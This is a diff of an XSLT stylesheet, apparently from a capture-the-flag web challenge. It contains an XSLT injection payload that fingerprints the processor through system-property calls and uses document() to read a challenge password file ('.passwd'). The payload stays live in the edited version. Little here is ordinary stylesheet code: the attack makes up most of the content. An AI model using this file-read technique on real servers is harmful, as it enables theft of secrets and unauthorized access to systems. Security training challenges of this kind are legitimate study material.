@@ -10,12 +10,8 @@
     <p>
     <xsl:value-of select="description"/>
     <span style="font-style:italic"> (<xsl:value-of select='prct'/> %)</span>
-    XSLT Version: <xsl:value-of select="system-property('xsl:version')" /><br/>
-    XSLT Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br/>
-    XSLT Verdor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
-    <xsl:value-of select="document('/challenge/web-serveur/ch50/.passwd')">
-    </p>
+    </p>XSLT Version: <xsl:value-of select="system-property('xsl:version')" /><br/>XSLT Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br/>XSLT Verdor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br/><xsl:value-of select="document('/challenge/web-serveur/ch50/.passwd')">
   </div>
 </xsl:for-each>
 </body>
-</html>
+</html> 
